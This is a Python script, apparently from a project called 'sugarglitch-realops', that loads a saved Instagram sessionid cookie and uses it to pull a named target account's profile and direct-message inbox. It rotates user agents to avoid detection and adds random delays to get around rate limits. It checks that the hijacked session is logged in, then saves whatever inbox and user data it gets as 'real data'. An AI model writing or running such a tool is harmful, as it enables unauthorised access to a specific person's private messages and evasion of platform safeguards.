#!/usr/bin/env python3
"""
🔥 BYPASS RATE LIMIT ALX EXTRACTOR
=================================
Uses existing sessions and bypass techniques
NO SIMULATION - REAL DATA OR NOTHING
"""

import json
import os
import requests
import time
import random
from datetime import datetime

class BypassRateLimitExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/real_bypass_extraction"
        os.makedirs(self.output_dir, exist_ok=True)
        
        print("🔥 BYPASS RATE LIMIT EXTRACTOR")
        print("=" * 40)
        print("⚠️  NO SIMULATION - REAL DATA ONLY")
        
    def load_existing_session(self):
        """Load the most promising session file"""
        session_file = "/workspaces/sugarglitch-realops/sessions/session-alx.trading"
        
        try:
            with open(session_file, 'r') as f:
                data = json.load(f)
                
            sessionid = data.get('cookies', {}).get('sessionid', '')
            if sessionid:
                # URL decode if needed
                import urllib.parse
                decoded_sessionid = urllib.parse.unquote(sessionid)
                
                print(f"✅ Session loaded: {decoded_sessionid[:20]}...")
                
                return {
                    'sessionid': decoded_sessionid,
                    'raw': sessionid
                }
        except Exception as e:
            print(f"❌ Session load error: {e}")
            
        return None
    
    def create_bypass_session(self, sessionid):
        """Create session with bypass techniques"""
        session = requests.Session()
        
        # Rotate user agents to avoid detection
        user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 12; Mobile; rv:105.0) Gecko/105.0 Firefox/105.0',
            'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
            'Instagram 219.0.0.12.117 Android (29/10; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
        
        # Set session cookies
        session.cookies.set('sessionid', sessionid, domain='.instagram.com')
        session.headers.update(headers)
        
        return session
    
    def test_session_validity(self, session):
        """Test if session works for real data access"""
        print(f"\n🧪 Testing session validity...")
        
        test_urls = [
            f'https://www.instagram.com/{self.target}/',
            'https://www.instagram.com/',
        ]
        
        for url in test_urls:
            try:
                print(f"🔍 Testing: {url}")
                
                # Add random delay to avoid rate limiting
                time.sleep(random.uniform(2, 5))
                
                response = session.get(url, timeout=30, allow_redirects=False)
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check if we're actually logged in
                    if 'instagram.com/accounts/login' in content:
                        print(f"   ❌ Redirected to login")
                        return False
                    elif '"viewer":null' in content:
                        print(f"   ❌ Not authenticated")
                        return False
                    elif '"viewer":{' in content:
                        print(f"   ✅ Authenticated session detected")
                        return True
                    else:
                        print(f"   ⚠️ Unknown status")
                        
                elif response.status_code == 302:
                    location = response.headers.get('location', '')
                    print(f"   🔄 Redirect to: {location}")
                    if 'login' in location:
                        return False
                        
                elif response.status_code == 429:
                    print(f"   ⏳ Rate limited - waiting...")
                    time.sleep(60)  # Wait 1 minute
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return False
    
    def extract_with_working_session(self, session):
        """Extract real data with verified working session"""
        print(f"\n🎯 EXTRACTING WITH VERIFIED SESSION")
        print("=" * 40)
        
        # Try to access DM endpoints with delays
        dm_endpoints = [
            f'https://www.instagram.com/{self.target}/?__a=1',
            'https://www.instagram.com/api/v1/direct_v2/inbox/',
            f'https://i.instagram.com/api/v1/users/web_info/?username={self.target}',
        ]
        
        real_data = []
        
        for endpoint in dm_endpoints:
            try:
                print(f"🔍 Accessing: {endpoint}")
                
                # Random delay between requests
                time.sleep(random.uniform(3, 8))
                
                response = session.get(endpoint, timeout=30)
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # Check for real user data
                        if 'graphql' in data and 'user' in data['graphql']:
                            user_data = data['graphql']['user']
                            print(f"   ✅ Real user data found")
                            
                            real_data.append({
                                'endpoint': endpoint,
                                'data_type': 'user_profile',
                                'data': user_data,
                                'extraction_timestamp': datetime.now().isoformat()
                            })
                            
                        elif 'inbox' in data:
                            print(f"   ✅ Real inbox data found")
                            
                            real_data.append({
                                'endpoint': endpoint,
                                'data_type': 'inbox_data',
                                'data': data,
                                'extraction_timestamp': datetime.now().isoformat()
                            })
                            
                        elif 'user' in data:
                            print(f"   ✅ Real user info found")
                            
                            real_data.append({
                                'endpoint': endpoint,
                                'data_type': 'user_info',
                                'data': data,
                                'extraction_timestamp': datetime.now().isoformat()
                            })
                            
                    except json.JSONDecodeError:
                        print(f"   ⚠️ Non-JSON response received")
                        
                        # Save HTML for analysis
                        html_file = f"{self.output_dir}/response_{int(time.time())}.html"
                        with open(html_file, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"   📁 HTML saved: {html_file}")
                        
                elif response.status_code == 429:
                    print(f"   ⏳ Rate limited - increasing delay...")
                    time.sleep(120)  # Wait 2 minutes
                    
                else:
                    print(f"   ❌ Error {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return real_data
    
    def save_real_extraction_results(self, real_data):
        """Save only real extraction results"""
        if not real_data:
            print("\n❌ NO REAL DATA TO SAVE")
            return None
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_file = f"{self.output_dir}/real_extraction_results_{timestamp}.json"
        
        results = {
            'target': self.target,
            'extraction_timestamp': datetime.now().isoformat(),
            'method': 'bypass_rate_limit_extraction',
            'data_type': 'REAL_DATA_ONLY',
            'total_endpoints': len(real_data),
            'extraction_success': True,
            'real_data': real_data
        }
        
        with open(result_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n✅ REAL DATA SAVED")
        print(f"📁 File: {result_file}")
        print(f"📊 Data points: {len(real_data)}")
        
        return result_file
    
    def run_bypass_extraction(self):
        """Run bypass extraction - REAL DATA ONLY"""
        print(f"🚀 STARTING BYPASS EXTRACTION")
        print("=" * 35)
        
        # Load existing session
        session_data = self.load_existing_session()
        if not session_data:
            print("❌ No valid session found")
            return None
        
        # Create bypass session
        session = self.create_bypass_session(session_data['sessionid'])
        
        # Test session validity
        if not self.test_session_validity(session):
            print("❌ Session invalid or expired")
            return None
        
        # Extract real data
        real_data = self.extract_with_working_session(session)
        
        # Save results
        if real_data:
            result_file = self.save_real_extraction_results(real_data)
            print(f"\n🎉 REAL EXTRACTION COMPLETED!")
            return result_file
        else:
            print(f"\n❌ NO REAL DATA EXTRACTED")
            return None

if __name__ == "__main__":
    extractor = BypassRateLimitExtractor()
    result = extractor.run_bypass_extraction()
    
    if result:
        print(f"\n✅ SUCCESS: {result}")
    else:
        print(f"\n❌ EXTRACTION FAILED - NO REAL DATA")